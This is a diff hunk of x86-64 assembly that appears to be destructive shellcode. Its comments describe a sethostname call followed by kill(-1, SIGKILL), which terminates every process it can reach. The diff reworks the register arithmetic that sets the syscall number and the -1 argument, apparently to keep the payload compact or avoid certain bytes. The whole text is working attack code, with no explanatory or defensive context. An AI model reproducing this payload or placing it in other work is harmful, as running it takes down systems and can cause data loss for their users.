@@ -33,10 +33,10 @@ syscall				; calling sethostname
 ;-- kill(-1, SIGKILL);
 				; rax should be a zero already
 				; from previous call
-add	al, 0x17		; adding 23
-add	al, 0x27		; adding 39
+add	al, 0x3e		; adding 62
 mov	rdi, rsi		; moving 8 into rdi from
-					; previous function
-sub	dil, 0x09		; setting rdi to -1
+				; previous function
+sub	dil, 0x07		; setting rdi to 1
+neg	rdi			; flip from 1 to -1
 inc	rsi			; set rsi to 9 for SIGKILL
 syscall				; call kill
